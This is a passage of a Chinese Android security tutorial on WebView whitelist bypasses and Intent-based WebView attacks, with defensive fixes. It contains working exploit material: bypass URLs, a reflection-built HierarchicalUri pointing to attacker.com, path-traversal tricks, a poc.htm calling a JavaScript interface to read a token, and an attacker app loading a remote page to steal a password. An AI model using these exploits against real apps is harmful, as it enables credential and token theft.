class="string">&quot;/&quot;</span>)); <span class="comment">//提取host</span></span><br><span class="line">    <span class="keyword">for</span> (String whiteDomain:whiteList)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (inputDomain.indexOf(whiteDomain)&gt;<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>  <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>绕过方式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">子域名 huawei.com.mysite.com</span><br><span class="line">http:<span class="comment">//huawei.com@www.rebeyond.net/poc.htm</span></span><br><span class="line">http:<span class="comment">//a:a@www.huawei.com:b@www.baidu.com 在android中使用getHost获取到的是huawei.com,但实际访问的是baidu.com</span></span><br></pre></td></tr></table></figure><p><strong>漏洞复现：</strong></p><p>我们打开一个样本APP，分析其代码块：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/45.png" alt="image-20220729211137555"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/46.png" alt="image-20220729211156801"></p><p>这里我们可以简单的发现代码对URL的相应部分进行了校验，这样我们就可以进行构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;insecureshop://com.insecureshop/web?url=https://www.baidu.com&quot;</span><br><span class="line">&quot;insecureshop://com.insecureshop/webview?url=http://www.baidu.com?-insecureshopapp.com&quot;</span><br></pre></td></tr></table></figure><p>我们构造了两条URL，然后可以绕过检验，然后我们直接启动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -W -a android.intent.action.VIEW -d URI的值</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/47.png" alt="image-20220729211417226"></p><p>这里我们可以实现任意的URI的访问和跳转</p><h4 id="（2）hearachical-Uri绕过"><a href="#（2）hearachical-Uri绕过" class="headerlink" title="（2）hearachical Uri绕过"></a>（2）hearachical Uri绕过</h4><p>假设我们加载的Uri不是通过Uri.parse，而是通过外部直接获取，我们可以构造hearachical  来绕过</p><p>我们可以使用 HierarchicalUri 和 Java Reflection API 进行攻击，同样我们分析一个样本的URL验证</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> getIntent().getData();</span><br><span class="line">   <span class="type">boolean</span> <span class="variable">isValidUrl</span> <span class="operator">=</span> <span class="string">&quot;https&quot;</span>.equals(uri.getScheme()) &amp;&amp; uri.getUserInfo() == <span class="literal">null</span> &amp;&amp; <span class="string">&quot;legitimate.com&quot;</span>.equals(uri.getHost());</span><br><span class="line">   <span class="keyword">if</span> (isValidUrl) &#123;</span><br><span class="line">       webView.loadUrl(uri.toString(), getAuthHeaders());</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p><code>android.net.Uri</code>在Android上被广泛使用，但实际上它是一个抽象类。<code>android.net.Uri$HierarchicalUri</code>是它的子类之一。Java 反射 API 使创建能够绕过此检查的 Uri 成为可能。</p><p>通过反射传⼊⼀个scheme、authoritiy和path，构造⼀个形式为<a href="http://legitimate.com@attacker.com的hierachicaluri实例即可绕过/">http://legitimate.com@attacker.com的HierachicalUri实例即可绕过</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line"></span><br><span class="line">            Uri uri;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//java反射获取类引用</span></span><br><span class="line">                <span class="type">Class</span> <span class="variable">partClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.net.Uri$Part&quot;</span>);</span><br><span class="line">                <span class="type">Constructor</span> <span class="variable">partConstructor</span> <span class="operator">=</span> partClass.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">                partConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">                <span class="type">Class</span> <span class="variable">pathPartClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.net.Uri$PathPart&quot;</span>);</span><br><span class="line">                <span class="type">Constructor</span> <span class="variable">pathPartConstructor</span> <span class="operator">=</span> pathPartClass.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">                pathPartConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">                <span class="type">Class</span> <span class="variable">hierarchicalUriClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.net.Uri$HierarchicalUri&quot;</span>);</span><br><span class="line">                <span class="type">Constructor</span> <span class="variable">hierarchicalUriConstructor</span> <span class="operator">=</span> hierarchicalUriClass.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">                hierarchicalUriConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">   </span><br><span class="line">                <span class="comment">//构造HierachicalUri实例</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">authority</span> <span class="operator">=</span> partConstructor.newInstance(<span class="string">&quot;legitimate.com&quot;</span>, <span class="string">&quot;legitimate.com&quot;</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">path</span> <span class="operator">=</span> pathPartConstructor.newInstance(<span class="string">&quot;@attacker.com&quot;</span>, <span class="string">&quot;@attacker.com&quot;</span>);</span><br><span class="line">                uri = (Uri) hierarchicalUriConstructor.newInstance(<span class="string">&quot;https&quot;</span>, authority, path, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">            intent.setData(uri);</span><br><span class="line">            intent.setClass(<span class="built_in">this</span>, TestActivity.class);</span><br><span class="line">            startActivity(intent);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>文件<code>TestActivity.java</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line">     <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">         <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line"></span><br><span class="line">         <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getIntent();</span><br><span class="line">         <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> intent.getData();</span><br><span class="line"></span><br><span class="line">         Log.d(<span class="string">&quot;evil&quot;</span>, <span class="string">&quot;Scheme: &quot;</span> + uri.getScheme());</span><br><span class="line">         Log.d(<span class="string">&quot;evil&quot;</span>, <span class="string">&quot;UserInfo: &quot;</span> + uri.getUserInfo());</span><br><span class="line">         Log.d(<span class="string">&quot;evil&quot;</span>, <span class="string">&quot;Host: &quot;</span> + uri.getHost());</span><br><span class="line">         Log.d(<span class="string">&quot;evil&quot;</span>, <span class="string">&quot;toString(): &quot;</span> + uri.toString());</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>然后可以获得日志信息：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/48.png" alt="image-20220729212609157"></p><p>漏洞防护：</p><p>我们只需要让攻击的应用程序获取<code>Uri</code>攻击者控制的对象并专门使用该对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Uri uri = Uri.parse(intent.getData().toString());</span><br></pre></td></tr></table></figure><p>从 API 级别 28 (Android 9) 开始，<a href="https://developer.android.com/guide/app-compatibility/restrictions-non-sdk-interfaces">禁止</a>使用内部接口——但这可以通过使用<a href="https://github.com/ChickenHook/RestrictionBypass">RestrictionBypass</a>等工具轻松绕过</p><h4 id="（3）URL-Scheme绕过"><a href="#（3）URL-Scheme绕过" class="headerlink" title="（3）URL Scheme绕过"></a>（3）URL Scheme绕过</h4><p><strong>漏洞原理：</strong></p><p>代码在进行URL校验是，检查了host，但是并未检查scheme，这样我们可以通过“javascript”进行绕过</p><p>例如：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/69.png" alt="image-20220730132455921"></p><p>也可以通过<code>file://www.mysite.com/sdcard/evil.html</code>绕过，某些版本WebView可正常解析为<code>file:///sdcard/evil.html</code></p><p><strong>漏洞复现：</strong></p><p>我们打开一个样本：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/70.png" alt="image-20220730132644522"></p><p>然后进行构造html</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/71.png" alt="image-20220730132704180"></p><p>最后就绕过了校验，实现了XSS注入</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/72.png" alt="image-20220730132735229"></p><p><strong>安全防护：</strong></p><p>URL校验函数</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/73.png" alt="image-20220730132918854"></p><p>Intent Scheme校验建议写法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span><span class="comment">//解析Intent Scheme URL</span></span><br><span class="line"><span class="number">2.</span> <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> Intent.parseUri(uri， flags);</span><br><span class="line"><span class="number">3.</span><span class="comment">//禁止打开没有BROWSABLE标签的Activity</span></span><br><span class="line"><span class="number">4.</span> intent.addCategory ( <span class="string">&quot;android.intent.category.BROWSABLE&quot;</span> );</span><br><span class="line"><span class="number">5.</span><span class="comment">//禁止设置intent的组件</span></span><br><span class="line"><span class="number">6.</span> intent.setComponent( nu1l);</span><br><span class="line"><span class="number">7.</span><span class="comment">//禁止设置intent的selector</span></span><br><span class="line"><span class="number">8.</span> intent.setSelector(nul1);</span><br><span class="line"><span class="number">9.</span><span class="comment">//打开intent指向的activity</span></span><br><span class="line"><span class="number">10.</span>context.startActivityIfNeeded(intent，-<span class="number">1</span>);</span><br></pre></td></tr></table></figure><h4 id="（4）服务端跳转漏洞绕过"><a href="#（4）服务端跳转漏洞绕过" class="headerlink" title="（4）服务端跳转漏洞绕过"></a>（4）服务端跳转漏洞绕过</h4><p><strong>漏洞原理：</strong></p><p>⽩名单域名内的服务端出现跳转漏洞时，仍然可以通过检查，并调⽤<code>javascriptInterface</code>，例如我们构造一个这样的URL:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.site1.com/redirect.php?url=https://www.baidu.com</span><br></pre></td></tr></table></figure><p>前面的<code>https://www.site1.com/redirect.php</code>是我们构造的虚拟的站点，当主机访问时，打开这个URL后，服务器会返回一个302响应，然后浏览器侧会斩词请求Location中指定的URL，对于具有单点登录功能的网站，这种类型的接口很常见。</p><p>然后我们就可以构造URL来绕过域名白名单：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.site1.com/redirect.php?url=http://223.****.32:8080/poc.htm</span><br></pre></td></tr></table></figure><p><strong>漏洞复现：</strong></p><p>首先我们编写攻击的htm：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>(<span class="variable language_">window</span>.<span class="property">myObj</span>.<span class="title function_">getToken</span>());</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后我们使用文件服务器来进行模拟</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/49.png" alt="image-20220730114753663"></p><p>我们接着编写测试样本代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLWebView</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">JsObject</span> &#123;</span><br><span class="line">        <span class="meta">@JavascriptInterface</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getToken</span><span class="params">()</span> &#123;</span><br><span class="line">            Log.e(<span class="string">&quot;rebeyond&quot;</span>,<span class="string">&quot;i am in getToken&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&#123;\&quot;token\&quot;:\&quot;1234567890abcdefg\&quot;&#125;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_url_web_view);</span><br><span class="line"></span><br><span class="line">        <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> (WebView) findViewById(R.id.Wind_webview4);</span><br><span class="line">        webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">        webView.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>());</span><br><span class="line">        webView.setWebChromeClient(<span class="keyword">new</span> <span class="title class_">WebChromeClient</span>());</span><br><span class="line">        webView.addJavascriptInterface(<span class="keyword">new</span> <span class="title class_">JsObject</span>(),<span class="string">&quot;myObj&quot;</span>);</span><br><span class="line">        String inputUrl=<span class="string">&quot;https://www.site1.com/redirect.php?url=http://223.****:8080/poc.htm&quot;</span>; <span class="comment">//ip地址自己写自己的</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (checkDomain(inputUrl))</span><br><span class="line">            &#123;</span><br><span class="line">                Log.e(<span class="string">&quot;rebeyond&quot;</span>,<span class="string">&quot;i am a white domain&quot;</span>);</span><br><span class="line">                <span class="comment">//webView.loadUrl(inputUrl);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (URISyntaxException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkDomain</span><span class="params">(String inputUrl)</span> <span class="keyword">throws</span>  URISyntaxException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!inputUrl.startsWith(<span class="string">&quot;http://&quot;</span>)&amp;&amp;!inputUrl.startsWith(<span class="string">&quot;https://&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String[] whiteList=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;site1.com&quot;</span>,<span class="string">&quot;site2.com&quot;</span>&#125;;</span><br><span class="line">        java.net.URI url=<span class="keyword">new</span> <span class="title class_">java</span>.net.URI(inputUrl);</span><br><span class="line">        String inputDomain=url.getHost(); <span class="comment">//提取host</span></span><br><span class="line">        <span class="keyword">for</span> (String whiteDomain:whiteList)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (inputDomain.endsWith(<span class="string">&quot;.&quot;</span>+whiteDomain)) <span class="comment">//www.site1.com      app.site2.com</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>  <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里我们可以分析代码中有一个白名单的域名检测函数<code>checkDomain</code>,但是我们可以通过构造URL来绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.site1.com/redirect.php?url=http://223.****:8080/poc.htm</span><br></pre></td></tr></table></figure><p>然后我们启动应用：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/50.png" alt="image-20220730115108664"></p><p>我们点击白名单绕过按钮：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/51.png" alt="image-20220730115207759"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/52.png" alt="image-20220730122859092"></p><p>我们可以发现这里就成功的绕过了白名单进行跳转</p><p><strong>安全防护：</strong></p><p>此时可以在<code>shouldOverrideUrlLoading</code>函数中拦截跳转，并对跳转的Url进行检查</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldOverrideUrlLoading</span><span class="params">(WebView view, WebResourceRequest request)</span> &#123;</span><br><span class="line"><span class="keyword">if</span>(chechDomain(request.getUrl().toString()))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//通过检查，允许跳转</span></span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">//未通过检查，允许跳转</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而很多使用<code>shouldOverrideUrlLoading</code>,也是不安全的使用状态，这样还是会存在一些攻击，具体参考：<a href="https://blog.oversecured.com/Android-Access-to-app-protected-components/#access-to-arbitrary-components-via-webview"><strong>Android：访问受应用程序保护的组件</strong></a></p><h4 id="（5）file协议绕过"><a href="#（5）file协议绕过" class="headerlink" title="（5）file协议绕过"></a>（5）file协议绕过</h4><p>APP经常会使用file:&#x2F;&#x2F;协议加载本地文件，通常会限制在一些特定路径中，参考文章：<a href="https://mabin004.github.io/2019/04/23/Android-WebView%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/">Android WebView URL检查绕过</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>)不要用url.startWith(”file:<span class="comment">//”)来判断是否为file协议，因为“FILE://”(大小)、“File://”(大小写)、“ file://”(前边加空格)、“file:”等方式都可以绕过检测。url.contains(“file://”)更不靠谱，推荐使用getScheme()来判断协议；</span></span><br><span class="line">(<span class="number">2</span>)file:<span class="comment">///android_asset和file:///android_res 也可以../穿越</span></span><br><span class="line">(<span class="number">3</span>)白名单判断了“../，但通过“..\”也是可以穿越的，例如file:<span class="comment">///sdcard/..\../sdcard/1.html</span></span><br><span class="line">(<span class="number">4</span>)getHost有漏洞（file:<span class="comment">//a:a@www.qq.com:b@www.baidu.com使用getHost获取到的是qq.com,但实际访问的是baidu.com)</span></span><br><span class="line">(<span class="number">5</span>)file:<span class="comment">//baidu.com/data/data/tmp 前边的baidu.com是可以不被解析的</span></span><br><span class="line">(<span class="number">6</span>)协议头不包括<span class="comment">///，还是仍然能够正常loadUrl，如file:mnt/sdcard/filedomain.html</span></span><br><span class="line">(<span class="number">7</span>)白名单判断了“../”，但通过url编码绕过，例如file:<span class="comment">///data/data/com.app/%2e%2e/%2e%2e/%2e%2e/sdcard/xxx</span></span><br><span class="line">(<span class="number">8</span>)replace(“../“,””)可以使用”….<span class="comment">//“绕过</span></span><br></pre></td></tr></table></figure><h3 id="4-Intent-WebView漏洞"><a href="#4-Intent-WebView漏洞" class="headerlink" title="4.Intent+WebView漏洞"></a>4.Intent+WebView漏洞</h3><h4 id="（1）Intent访问导出组件加载恶意界面和窃取信息"><a href="#（1）Intent访问导出组件加载恶意界面和窃取信息" class="headerlink" title="（1）Intent访问导出组件加载恶意界面和窃取信息"></a>（1）Intent访问导出组件加载恶意界面和窃取信息</h4><p><strong>漏洞原理：</strong></p><p>主要通过 WebView 对外暴露的接口和Intent访问导出组件可以导致的攻击手段</p><p><strong>漏洞复现：</strong></p><p>我们编写一个样例代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JsIntentActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_js_intent);</span><br><span class="line">        <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> findViewById(R.id.Wind_webviewIntent);</span><br><span class="line">        webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">        webView.addJavascriptInterface(<span class="keyword">new</span> <span class="title class_">AndroidtoJs</span>(), <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        webView.loadData(<span class="string">&quot;&quot;</span>, <span class="string">&quot;text/html&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Uri</span> <span class="variable">getUri</span> <span class="operator">=</span> getIntent().getData();</span><br><span class="line">        webView.loadUrl(String.valueOf(getUri));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 提供接口在Webview中供JS调用</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AndroidtoJs</span> &#123;</span><br><span class="line">        <span class="comment">// 定义JS需要调用的方法，被JS调用的方法必须加入@JavascriptInterface注解</span></span><br><span class="line">        <span class="meta">@JavascriptInterface</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getPassword</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;WindXaa12345678&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们可以看出我们获取了密码<code>WindXaa12345678</code>，一般应用程序会对这里进行加密或者混淆，我们这里简单演示就不进行加密了</p><p>我们将该组件设置为导出组件</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/32.png" alt="image-20220729171422196"></p><p>我们对实例样本分析，这里就可以利用接口导出的漏洞进行攻击</p><p><strong>漏洞复现：</strong></p><p>我们再编写攻击样本：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> findViewById(R.id.button);</span><br><span class="line">        button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">Intent</span> <span class="variable">attackIntent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">                attackIntent.setClassName(<span class="string">&quot;com.iwindxaa.webview&quot;</span>,<span class="string">&quot;com.iwindxaa.webview.JsIntentActivity&quot;</span>);</span><br><span class="line">                attackIntent.setData(Uri.parse(<span class="string">&quot;http://ip地址端口号/attack.html&quot;</span>));</span><br><span class="line">                startActivity(attackIntent);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们在本地编写恶意的html，利用前面讲述的远程加载</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span 